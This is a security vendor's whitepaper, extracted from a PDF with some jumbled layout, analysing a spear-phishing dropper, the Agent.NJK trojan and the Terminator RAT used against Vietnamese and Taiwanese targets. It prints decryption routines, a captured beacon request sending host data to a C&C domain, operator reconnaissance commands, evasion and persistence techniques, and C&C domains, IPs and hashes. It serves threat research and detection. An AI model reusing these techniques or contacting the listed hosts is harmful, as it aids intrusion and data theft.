Did you say
Advanced Persistent Threats?

Did you say Advanced Persistent Threats?

Here we analyze four targeted attack tools with Taiwan and Vietnam
in their sights - but somehow linked together - and the reason why
they shouldn't be called ‘advanced’.

• Social engineering vector (no exploit code) with very credible
documents
• Bad criminals: typos in configuration, naive cryptographic
implementation, weak code practices
• Sophistication variability: from no obfuscation to hidden position
independent code, XOR encryption, XTEA encryption, stand-alone
re-usable components
• Tailored infections: one threat doesn't persist, the other doesn't
do anything before a reboot

Figure 1: Targeted entities were located in Vietnam and Taiwan

Once in a while we get to spend time analyzing malicious code that is
not as widespread or not as well-obfuscated as other threats we've
encountered in the past. This article is about one such threat. We
decided to spend some time on this analysis because of interesting
strings in one of the components referring to Vietnam’s Central Post
and Telecommunications Department. But before we delve into
the topic lets first highlight some of the findings:
• Entities in Taiwan and the Vietnam government are targeted
• Observed attacker interaction
• Evidence of an unidentified APT actor

Figure 2: Analyzed threats

You can see in the above figure all the malware samples that this
article will cover. the file received by the victim is always the dropper
which we will cover shortly. Since they were carrying two different
threats the dropper hashes are not the same but their functionality
is equivalent: therefore it is summarized as a single threat and
1

Did you say Advanced Persistent Threats?

considered a re-usable component in the attacker’s arsenal. We have
investigated two ‘dropped’ threats, namely Agent.NJK and Terminator
RAT – which also carries an embedded binary.

Good ol’ social engineering

Figure 3: Appearance of the files

As we noticed from our telemetry data, the malicious software
reaches its target through spear-phishing campaigns. the first
dropper we analyzed came from the webmail interface of
a Vietnamese governmental institution. Using targeted emails
allows more chance of succeeding in the attack by using a more
personalized and convincing message. It also narrows the distribution
of the malicious files, giving them a longer shelf life since there is
less chance of their being found and analyzed by Anti-Virus (AV)
companies.
With knowledge of the characteristics of the first dropper, we were
able to find a related piece of malware in our collection. As mentioned
previously, they were carrying different threats but also had
a different filenames
Threat

File name

Translation

Win32/TrojanProxy.Agent.NJK

Bao cao ket qua.doc
[137 spaces].exe

Vietnamese for
"report the results"

Terminator RAT
(Win32/Protux.NAR)

檢驗報告.exe

Chinese for
"inspection report"

that the file is a normal Word document, the executable displays
the icon of a Word document.
Upon execution these droppers will decrypt their configuration
parameters using a simple one-byte key XOR-based cipher best
described with some python code below. This configuration is stored
in the last 32 bytes of the last portable executable (PE) segment
of the executable. Inside this configuration is a checksum, some
offsets and lengths of internal resources along with other seemingly
unused fields, as you will see in the struct pictured below. a hardcoded integer in the code is compared with the checksum in order
to validate that configuration decryption worked. This checksum is
def xor _ decrypt(ciphertext, key):
for i in range
(len(ciphertext)):
		 c = ciphertext[i]
		if c:
			if 
c != 0xff:
c ^= key
			if (c and c != 0xff):
ciphertext[i] = c
return ciphertext

The presence of all those spaces is used to push the ".exe" off
the screen and out of sight of the victim. To further convince the user
Listing 1: XOR-based cipher

struct hidden _ segment _ data
{
int checksum;
char delimiter;
char unused[3];
int pe _ file _ offset;
int pe _ file _ size;
char unused[4];
int doc _ file _ offset;
int doc _ file _ size;
char xorkey;
char unused[2];
char last;
};
Listing 2: Hidden configuration

2

Did you say Advanced Persistent Threats?

the same in both cases. the offset and length pairs are used to extract
files from inside itself into the filesystem.

Nature of the file

Filename

Malicious payload

%TEMP%\~hCb58.tmp

The dropper first drops the main malicious binary and then a Word
document into the user's temporary folder. Both files are decrypted
using the same simple XOR technique except that the malicious
binary is prefixed with 5 bytes that are hard-coded in the dropper (MZ
header), and then XOR'ed with another hardcoded one-byte key. We
believe this is done to avoid being detected by some AV.

Word document

%TEMP%\~hC29f.doc

Copy of itself

%TEMP%\~hCb37.tmp

First, after the extraction, the malicious binary will be executed by
the dropper. the behavior of the analyzed binaries will be covered
later. the dropper will then copy itself using a handle retrieved
with GetModuleHandle. It will execute this fresh copy with some
command line arguments in order to clean up after itself: namely,
the current full path and filename of the dropper and the full path and
filename of the dropped Word document. Finally, it will exit.

Table 1: Dropped files

This same copy of the dropper, once executed with command-line
arguments, has a different operation. It will first sleep for one second,
leaving enough time for the original dropper execution to terminate.
Then it will remove this original file and copy the decoy document
(~hC29f.doc) in its place, keeping the proper .doc extension. Finally,
a ShellExecuteW with the open operation is run on the newly
copied document in order to open the proper editor registered for this
file type.

For example this is what ends up being run:
C:\Documents and settings\user\Local Settings\
Temp\~hCb37.tmp\
"C:\Documents and settings\user\Downloads\Bao cao ket
qua.doc[137 spaces].exe"\
"C:\Documents and settings\user\Local Settings\
Temp\~hC29f.doc"
Listing 3: Dropper executes the above

Figure 4: Dropper operation

3

Did you say Advanced Persistent Threats?

All this work is done to effectively simulate the result one would
expect when double clicking on an innocuous Word document except
that in this case malicious code was executed first.

Figure 6: Taiwan decoy document

Figure 5: Vietnam decoy document

The combination of the spear-phishing, hiding the file's extension,
a work-related file name and a Microsoft Word style icon can be
pretty convincing for a user who had no proper security awareness
training or without proper desktop hardening and protection against
executables sent by email. the use of these simple techniques is well
documented inside Mandiant's APT1 report. Notice that no software
vulnerabilities are exploited by criminals in order to get their malware
to run.
In the dropper there are two different techniques used to hide calls:
a function that essentially re-implements GetProcAddress, called
4

Did you say Advanced Persistent Threats?

with hardcoded plaintext strings, and legitimate GetProcAddress
calls but using an obfuscated lpProcName (XOR 0x17 of every other
two chars). Interestingly, most of the calls are not obfuscated. Again,
it feels like iterative AV evasion hard at work.
Aside from the fact that it seems easy to re-purpose, the dropper
doesn't strike us as a particularly well written piece of code. There are
notorious anti-patterns present in the codebase like a God object and
some copy-and-paste programming (although to be fair this could be
the result of compiler optimization).

Win32/TrojanProxy.Agent.NJK
The first dropped binary that we analyzed is what our engine detects
as Win32/TrojanProxy.Agent.NJK. This is a Visual C++ trojan that
communicates over HTTP with hard-coded Command and Control (C&C)
servers. In the sample we analyzed, the three servers supported by
the trojan configuration were in fact pointing to the same domain
name vietnam.vnptnet.info, but using different ports (80, 443 and
5050).
The malware will adjust its TCP timeout for HTTP requests to 15
minutes and then loop forever trying to contact the C&C domain via
the three ports in configuration. an interesting fact about this threat
is its lack of persistence, meaning that it will be executed only once
and will not be relaunched if the system reboots. There is no obvious
attempt at obfuscation and simply running strings on the binary
reveals a great deal about the sample and its capabilities.
In its attempt to contact the C&C the malware will send several pieces
of information about the host in a GET request and use a specific
User-Agent string. the user data is in a 105 bytes array, encoded in
hexadecimal and sent in the path component of the GET request.
It contains information such as: a string we believe is used to track
attack campaigns; the internal IP address of the host; the Computer
Name; a Windows Version ID; and the current username executing
the process. No encryption is applied to this data. Below is the exact
format of this payload.

Figure 7: Vietnam document metadata

Figure 8: Taiwan document metadata

5

Did you say Advanced Persistent Threats?

The C&C commands are sent unencrypted and are always 796 bytes
long. the first Integer in the command data is the command ID.
the supported commands are:
Command id

Command description

1000

The command-line is executed by the victim and
stdout and stderr are sent back to the C&C

2000

The victim replies "\r\n\r\nRecieve KeepAlive
Commond\r\n\r\n" (including the typos...)

3004

Download a file to the victim's computer.
Filename is specified in the command data.

3005

Upload a file to the C&C. an offset argument can
be specified so as to upload only a part of the file.

3006

Change the current directory to the one specified
in the command data.

3007

Set the time (in ms) for the WaitForSingleObject
function of a command line execution (command
id 1000)

3008

Sends to C&C information about the drives' total
size, free space, letters and names.

3009

Lists the files in a specified directory. Filename,
last modification date and sizes are sent.

Listing 4: Sample HTTP GET Request

3010

Delete a given file by name

The server will reply with conventional HTTP server headers except
that it adds an Accept header field with the value "x-wav/y-img"
(something seen before). the trojan will not process the server's answer
unless this string is present in that header. Note that Accept headers
are usually part of the client HTTP request and not server responses.

3011

Spawn a process with the command-line given in
command data. Nothing sent back to C&C.

Figure 9: Initial payload sent by the client

Once encoded requests look like the one below:
GET /4350542D4E4D43000000000000000000000000000000000031393
22E3136382E3136362E31343500555345522D3938394243313335353500
0000000000000000000000000000000107757365720000000000000000
0000000000000000000000000000000000000000 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows
NT 5.0; .NET CLR 1.1.9527)
Host: vietnam.vnptnet.info

Table 2: Agent.NJK supported commands

6

Did you say Advanced Persistent Threats?

Very simple, nothing fancy, and the code doesn't reveal much about
the attacker’s intentions. Unfortunately, all that is left to the trojan
operator so we can't draw any conclusions about the operation with
only the malware sample to work from. Rather than being simply
naive, this is rather stealthy. But then again, some funky strings are
also present in the binary like "I want to go to the GREAT WALL, inner
Mongolia very much" and some unused proxy credentials (somnuek.
bu / 044253516). These proxy credentials are not referred to anywhere
in the code which leads us to think that this is a feature supported by
the malware that was compiled out when this threat was assembled
for this campaign.
The hardcoded campaign string (CPT-NMC) sent by the client
further confirms the targeted nature of the attack. CPT stands for
Central Post and Telecommunications Department, a department
of the Vietnamese government. We can also notice that the top-level
domain used for C&C (vnptnet.info) is strikingly similar to Vietnam's
vnpt.vn which is Vietnam Posts and Telecommunications Group
and probably chosen as a means of camouflage within Intrusion
Detection System (IDS) logs. Finally, the decoy document writes
about telecoms and testing and carries some network diagrams,
which all seems very credible to a potential victim. Looks like this
campaign was aimed at Vietnam's CPT and we know Vietnam's officials
have been under targeted attack this year.

are the highlights of the interaction that we have observed on
the system.
1. client <		 command id/name: 3008/Get Drives Infos
client ->
		label: C:
type: 3 (DEVICE _ FIXED)
free: 7828
total: 10228
		label: D:(8
type: 5 (DEVICE _ CDROM)
free: 0
total: 589
2. client <		command id/name: 1000/ExecuteCommandLine executed:
netsta -ano
client ->
		
'netsta' is not recognized as an internal or
external command, operable program or batch file.

We're up all night to get lucky

3. client <		command id/name: 1000/ExecuteCommandLine executed:
netstat -ano

We saw an operator interact with a system we infected and
monitored. We even got some evidence of manual operation. Here

client ->
		...
7

Did you say Advanced Persistent Threats?

and then other commands:
4. set
5. dir C:\DOCUME~1\user\recent /od
6. dir C:\DOCUME~1\user\desktop
7. dir c:\
and then it stopped
Listing 5: Agent.NJK attacker interactions

These are all reconnaissance operations: netstat to view current
network interactions, drive enumeration, set to view the current
environment variables and then some file locations were explored.
Something that leads us to think that this operation is not automated
is the typo highlighted at interaction (2) a behavior we’ve seen
before. netsta was written instead of netstat, leading to the 'not
recognized' error sent to the server. We see no good reason to
fake such an operator error and this is why we think we caught
a legitimate typo. Here is a screen capture of some of the content of
the interactions that was left out of the above highlights. As you can
see, all this information is sent in plain text over the network.

Figure 9: Initial payload sent by the client

8

Did you say Advanced Persistent Threats?

In the above screenshot we notice that the server replied with the full
HTTP headers in the packet highlighted by (1) and with a ContentLength of 796 bytes just like any C&C commands. However, the server
doesn't send these bytes in that packet, so the client hangs waiting
for those bytes to come in. After a 30 minute delay the server just
sent a TCP reset (RST) to close the connection. the client was never
allowed again onto the server, getting instantaneous TCP resets for
any connection attempts on any of the three ports configured as you
can see in the screenshot below.

Figure 12: No response, various ports retried (80, 443, 5050)

Figure 11: Agent.NJK - end of the network connection

9

Did you say Advanced Persistent Threats?

This is another behavior that reveals a little bit more information
about the way they operate. Once the victim computer is flagged as
not of interest to the operators, it is actively blocked from the C&C at
the TCP layer rather than at the application layer (HTTP).
The non-persistence characteristic of the attack strengthens
the hypothesis that it is targeted since the attackers will leave little
trace and little network activity if they don't install an additional
component through the trojan. a typical attack scenario with this
tool would then be: figure out potential victims in an organization;
send spear-phishing emails; wait; get connections from the trojan;
and quickly and interactively investigate the computers for
the sensitive data you are looking for. If the data isn't there pull
the plug, and if it is there install an additional component through
the commands for file download (3004) and file execution(3011).
Without full incident investigation forensics, which we are not in
a position to perform, being an AV vendor rather than an incident
response team, there is little we can do to help victims of this threat
know what happened on their systems except to document how it
works and hope that this information will be useful.

Terminator RAT (aka FAKEM RAT)
When we started analyzing this threat, our product detected it as
Win32/Protux.NAR. When we reverse engineered the cryptographic
protocol of the network communication with the C&C we found out
that the threat was documented by malware.lu and Trend Micro as
Terminator RAT or FAKEM RAT, but that our sample diverged a lot
from the one they analyzed, and carried an additional binary. Last
month, FireEye released an analysis of a sample very similar to this one but
the hashes are still different. In this article, we will focus on giving
additional details of the threat and we encourage you to refer to these
past articles for further background information.
We first found out that what we called Win32/Protux.NAR was
in fact the Terminator RAT when we looked at the network
encryption and stumbled on malware.lu’s report titled APT1: technical
backstage. Although their reference to the APT1 group is challenged
by the community, we definitely have here a private Trojan that has
been re-used on several campaigns by the same group. Compared
with the Agent.NJK trojan, here the sophistication level is cranked up
one notch. First, the configuration and strings are encrypted using
a slightly modified implementation of XTEA. XTEA uses a 128 bit key
and work on 64 bit blocks.

10

Did you say Advanced Persistent Threats?

The implementation is naive since it uses the worst block cipher mode
of operation as you will see in the screenshots below. 64 bit blocks of
zeros always

Figure 14: Sample ciphertext at 0x404198 with obvious patterns

Figure 15: Plaintext at 0x404198 after decryption

With proper use of block chaining figure 14 wouldn’t have carried any
discernable pattern. Here’s the configuration of our sample before
decryption:

Figure 16:
Configuration
and strings
before decryption

Figure 13: Mandatory cryptographic loop screenshot

11

Did you say Advanced Persistent Threats?

(1) is the XTEA key, (2) shows two ports (9000, 9090) and some
other unencrypted material we couldn't figure out, (3) shows more
unencrypted strings related to the way the malware operates but
with null bytes injected in them (the strings are re-assembled before
being used in the code).

(1) is the folder where the malware is installed (in %APPDATA%), (2)
marks the filenames given to the copied and extracted files, (3) shows
the C&C's domain name, (4) is the name of the PE image resource
directory entry where further payloads are hidden (an executable
file and position independent code) and (5) shows the registry keys
modified for persistence.
Next, it will load and install in memory the offsets to some functions
that are not declared in the PE import table. To do so they reimplemented an equivalent of GetProcAddress just like they did
in the TrojanProxy.Agent.NJK threat. However this time the original
dll and function name strings are neither encrypted nor obfuscated
and the offsets are installed in fixed memory locations in the data
segment so they are easy to cross-reference for further analysis of
the threat. They could have made the job harder but they didn't.
On its first run, there is no networked malicious behavior. It will
create a thread that will change the path of the Startup Folder in
registry (to %APP _ DATA%\2019), copy the existing files from the old
Startup Folder to the new one, move itself with the MOVEFILE _
DELAY _ UNTIL _ REBOOT flag to the new Startup Folder under
the name "svchost .exe", decrypt and extract a PE from within itself in
the Startup Folder with the name "winslogon.ini" (which we will refer
to as the proxy tunnel component), do a move with the MOVEFILE _
DELAY _ UNTIL _ REBOOT flag to rename it to "winslogon.exe" and
then quit. This is summarized below:

Figure 17: Decrypted configuration and strings

12

Did you say Advanced Persistent Threats?

As you can see, there is also code to handle failure in the Startup
Folder registry changes. the fallbackPersist call will copy itself to
the current Startup Folder with the name wuauclt.exe and then exit.
Depending on the location of that folder this will either delay another
attempt at modifying the registry on the next reboot - until someone
with proper privileges to change this registry settings logs in - or it
will trigger the main payload which we will describe shortly.

Always moving
As you saw this threat relies heavily on the MOVEFILE _ DELAY _
UNTIL _ REBOOT flag of the MoveFile() function. This serves as
a simple way to relocate the malware executable even if the file is
currently executing. It may also prevent triggering heuristics and
sandbox technologies. That said, those delayed moves don't stop
there. On each subsequent execution of the binary a little evasion
maneuver is performed. First, it will copy itself into a temporary
location (GetTempPath() + "~7ti2"). Then, a random number of
random bytes are appended to the end of the file. Lastly, a move
with the MOVEFILE _ DELAY _ UNTIL _ REBOOT and MOVEFILE _
REPLACE _ EXISTING flags will be performed to replace the currently
running binary on reboot. This implies that the hash will change on
every reboot without affecting proper operation.
All of which can be visually represented by the following diagram:

Figure 18: Persistence code with a branch to deal with failure

13

Did you say Advanced Persistent Threats?

and strings and thread creation as on its first run, but then the thread
takes a separate branch based on the fact that it is run from a folder
which contains the "App" string. In that branch it will first sleep for 5
minutes and then will perform the copy/move operation described
earlier, and then reach its main payload.
That payload will allocate memory, copy the PE image resource
directory entry with id 0x8A under the ACCELORATOR resource
directory into this newly allocated memory, and apply an XOR with
a single byte key (0x32) to encrypt it. This last encryption operation
seems strange since it could have already been pre-encrypted that
way in the resource entry, but this wasn't done for reasons still
unknown to us.
As a side note, ACCELORATOR appears to be a clever typo of
ACCELERATOR, a term used to describe keystrokes defined in
applications and usually stored in PE resources.

Figure 19: Terminator's evasion maneuver

Main payload

This allocated memory is actually executable code. We will refer
to this as position-independent code from this point on. a few
more things happen before moving into this newly extracted code
segment: resolve the current host's IP, XOR encrypt and copy that IP
and a hardcoded port 8000 at specific offsets in that code (you will
understand why later) and then add some 32 bytes of XOR'ed random.
All XOR operations are performed with the same 0x32 single byte key.

After a reboot, when Windows runs every executable in the Startup
Folder, the two binaries "svchost .exe" (the main component) and
winslogon.exe (the proxy tunnel component) will be executed.
the main component performs the same decryption of configuration
14

Did you say Advanced Persistent Threats?

The position-independent code makes some unconventional use of
the registers so this leads us to believe that this was written directly
in assembly language. First, the memory segment itself will be XOR
decrypted with a single byte key (0x32). Then it will load the addresses
for all the functions it will use later. It does so by re-implementing
LoadLibrary and GetProcAddress. However instead of loading
the function names as strings, it uses a table of pre-computed ROR
hashes for each function. the code regenerates the hash for each
function in the DLL and when they match, the hash is replaced by
the function's address in the table. This technique is quite common
and has been documented before. On the other side, the library name is
stored as a string.

Figure 20: Position independent code loading and execution
Figure 21: kernel32.dll hashes to lookup

Figure 22: After loading function addresses

15

Did you say Advanced Persistent Threats?

The code then creates an Event named 'sxX5{c4' with
the CreateEvent function and uses it as a mutex to ensure that
only one copy of itself will execute at any one time. Now, moving on
to the main payload, we reach a loop on all C&Cs in its config. Two
of these are hardcoded and are the same as the one in the XTEA
encrypted config, as mentioned earlier. the third is the one injected
earlier which points to the host's current IP and hardcoded port
8000 (as explained later). It will loop forever on all three and will
sleep 30 seconds if it can't connect. Upon a successful connection,
the malware will send information about the client to the C&C in
a 1024 byte packet. the format is pictured below.

bytes long and the system's codepage is included as an integer. There
are also some hardcoded integers: two integers of value 0x130, 0x0
(1) and an integer of value 0x30005 (2). Both of these are identical to
those observed by FireEye. There is also some string value that could
be the campaign ID (3). Unlike the other unknown values this one is
not embedded in the code but in the configuration, and there is some
attempt at obfuscating the access to the variable, which in our case
was the string "wet". the rest of the packet is empty (bytes 321 to 1024)
except for the last byte where there is a newline character ("\n").

Figure 24: Position independent code loading and execution

Figure 23: Position independent code loading and execution

The header is made up of the random data that was previously copied
in from the main component with every two bytes padded with
the same pattern. Username and Computer name are strings 128

The communications are encrypted using a simple scheme: each byte
of the plaintext is XOR'ed with every character in the key and then
rotated to the right by 3 (ROR'ed) after each XOR operation. the key
is static and is "YHCRA" ("ARCHY" backwards). This is easier to explain
with code:

16

Did you say Advanced Persistent Threats?

def encrypt(pt):
key = "ARCHY"[::-1]
ct = ""
for c in pt:
		
p = ord(c)
		for k in key:
			
p = p ^ ord(k)
			
p = ror(p, 3)
		
ct += chr(p)
return ct
Listing 6: Terminator network encryption

Once decrypted, the server traffic contains a command ID in the first
integer of the 1024 byte payload returned. Well described by Trend
Micro, the commands supported by this RAT are the following:
Command id

Command description

0x211

Execute code attached in command data

0x212

Reconnect to receive data

0x213

Sleep, close socket and reconnect

0x214

Exit
Table 3: Terminator supported commands

commands. Command prompt, file manager, host information,
process management, registry management, screen captures, service
management, password stealing, and file upload, were all capabilities
that they observed.
Even though we had a very similar threat to hand the C&C domains
extracted from configuration were slightly different.
Domain

IP

Port

"catlovers.25u.com" (1)

doesn't resolve

9000

dryboxs.4dq.com

123.51.208.142

9090

localhost

depends (2)

8000

The first domain configured (1) contains a space before the nullbyte string terminator which means that the DNS resolver is
unable to resolve it. It is thus never used by the malware. As we
said earlier, the third domain is looked up using gethostname and
gethostbyname (2) and then copied into the position independent
code before it is launched. 25u.com and 4dq.com are both operated
by the changeip.com dynamic DNS service operated in the US. IP
123.51.208.142 is Taiwan based.
Here's a table that highlights the differences observed between
the various observed campaigns:

As you can see, these are again very generic, meaning that
the malware's true goals and capabilities are hidden when doing
static analysis. However Trend Micro was able to observe attackers
and documented some of the code that attackers sent in their 0x211

17

Did you say Advanced Persistent Threats?

Trend Micro’s analysis

FireEye’s analysis

ESET’s analysis

Activity

Since 2009

June 2013

June 2013

Campaign

undisclosed

zjz1020

wet

Distribution

Word or Excel documents with exploit
code

Word or Excel documents with exploit
code

Social engineering

Installation

Registry Run entry

Modified Startup Folder

Modified Startup Folder

XTEA key

None used

0x3c78…

0x9ac9…

Network traffic

Fake header in first 32 bytes

Repeated pattern in first 32 bytes

Random bytes with padding intermixed
in the first 32 bytes

Proxy tunnel

No mention of this component

Stand-alone component for exfiltration
through corporate proxy

Stand-alone component for exfiltration
through corporate proxy

Proxy filename

None

sss.exe

winlogon.ini then winnlogon.exe

C&C

• vcvcvcvc.dyndns.org
• zjhao.dtdns.net
• avira.suroot.com
• *.googmail.com
• *.yourturbe.org
• freeavg.sytes.net

• liumingzhen.zapto.org
• liumingzhen.myftp.org
• catlovers.25u.com
• localhost port 8000

• "catlovers.25u.com[space]" port 9000
(broken)
• dryboxs.4dq.com port 9090
• localhost port 8000 (see proxy tunnel)

IPs

Varied

123.51.208.69

123.51.208.142 (same /24)

DDNS Provider

DynDNS, DtDNS, noip.com

noip.com

changeip.com

Table 4: Summary of the differences in the campaign

18

Did you say Advanced Persistent Threats?

Summary of similarities
• Same network encryption algorithm ("ARCHY"[::-1] xor/ror3)
• Same 1024 byte network payload
• Same commands (0x211, etc.)
• Most C&C rely on dynamic DNS
• Operated from the same /24 network owned by a Taiwanese ISP
This threat lacks a coherent design and seems to be iteratively
modified to accomplish the attackers’ agenda on the fly. the presence
of 3 different encryption mechanisms and two different techniques
to load function addresses tends to justify this assumption.
Furthermore, using XTEA encryption for the C&C information while
also showing them in plaintext in the position independent code
seems like a mistake. Finally some functions are awkwardly patched
to add features like the encryption / decryption functions shown
below. an on / off (1) flag is used to determine if the function is calling
the XTEA encryption (2) or some XOR with a fixed one byte key (3)
reminding software engineers of the coding-by-exception anti-pattern.

Figure 25: Strange cryptographic code paths

Having various analyses on the same threat is interesting because
we can see what gets re-purposed when a campaign changes. In
the current Terminator RAT case we can see that both malware
components and infrastructure components were altered. XTEA keys,
network protocol headers, and the dropped proxy tunnel component
filename were changed in the binary itself while DDNS providers
and IP addresses were changed on the infrastructure side. It’s also
19

Did you say Advanced Persistent Threats?

interesting to see that the use of ACCELORATOR name as the hidden
PE resource or the network protocol encryption key are things that
haven't changed between campaigns. What conclusions can be
drawn from this observation is an exercise left to the reader.

Proxy tunnel component
Again, comprehensively described by FireEye as sss.exe, this component
is present for the eventualities where the target's network doesn't
allow an outgoing network connection to reach the C&C servers
directly. In a nutshell, it binds to the local port 8000 and will tunnel
through anything that connects to it via the legitimate proxy
configured on the computer. It uses the HTTP CONNECT verb to get
an end-to-end tunnel up to the C&C.
In our investigation, the file was named winslogon.exe and had
a different hash, solely because the configuration (and maybe
the code) was different. We also noticed the presence of an encrypted
log file (hardcoded to %TEMP%\~DF3bbs.tmp) which can be decrypted
with a single byte key XOR (0xAB) as shown by the code below.
key = 0xAB
ct = open("logfile", "rb").read()
pt = "".join([chr(ord(e) ^ key) for e in ct])
print pt
Listing 7: Decrypt proxy tunnel component logs

It uses an Event Object named with the non-printable character
represented by 0x13 to ensure that only one instance of the proxy is

running. Additionally, as with the Terminator / FakeM RAT threat,
the binary will perform a little dance meaning that on each execution
it will copy itself into a temporary location (GetTempPath() + "~7ti3"),
append a random number of random bytes to the end of the file,
then add the XTEA encrypted configuration. Lastly, a move with
the MOVEFILE _ DELAY _ UNTIL _ REBOOT and MOVEFILE _
REPLACE _ EXISTING flags will be performed to replace the currently
running binary. So the hash of the file will change but behavior and
functionality stays intact. Finally, we observed a different location for
the stored proxy configuration than the one FireEye reported. In our
case it was stored in %Windir%\Proxy.
The addition of this component as a stand-alone to augment
Terminator RAT's exfiltration capabilities is very interesting as it could
be easily re-used. Additionally, a loosely coupled component with no
malicious behavior (although suspicious) packaged with a RAT whose
malicious payload is well hidden in position-independent shellcode
supporting very generic commands, makes the static analysis of
the threat quite difficult and leaves everything to the imagination
about what it is that the attackers are after.

There is no a in this APT
Indeed, none of these threats were packed to thwart reverseengineering, no exploit code was used and there were several
observations of poor software development and operational
practices: sloppy coding, bad cryptography, operator errors, leakage
of unused proxy credentials and even mistakes in configuration that
rendered a C&C domain completely useless. This is not ‘advanced’.
20

Did you say Advanced Persistent Threats?

However, as long as these less sophisticated attacks are still
successful they will continue, because they are obviously cheaper to
perform than the more complex ones.
We can see two [A]PT strains at work here. One with no a where
we have low-complexity low-cost attacks where manual operators
are thrown at several targeted campaigns, using simple malware
modified just enough to avoid detection. Then, on the other hand,
groups seem to exist that truly deserve the a epithet – A-teams, you
might say. (Note that we avoided the cyberwar kind of APT.)
So, before issuing your press-release about getting popped by an APT
group, at least make sure that you are not simply overly exposed to
simplistic B-list attacks. User awareness training and locked-down
group policies incorporating the filtering of executables in emails
would have mitigated or prevented the threats described in this post.
Is your company at least taking these steps?

Win32/TrojanDropper.Small.NNK
•5
 8e1dfa7ace03a408d2b20c1fab6e127acbdc71f492366622cd52064844
43ed7
• 3 f58a0ea8958c5bf88aa9cfcefe457393f0a96bba9f05f301ba6a15b65d
5b64a
Win32/TrojanProxy.Agent.NJK
• 54c5517541187165fd9720dfe8cff67498d912d189d649cc652d8b113bae
8802
Win32/Protux.NAR (Terminator RAT)
•4
 25a919cb5803ce8fabb316f5e1be611f88f5c3813fffd2b40f2369eb70
74da9
Win32/Protux.NAR (Terminator RAT) embedded proxy tunnel
component
• Ba6cc9fbcb3d806fefb4d0f2f6d1c04b81316593dfe926b4477ca841ac17
354e2

Author: Olivier Bilodeau
Contributors: Mathieu Lavoie, Marc-Etienne M. Léveillé

21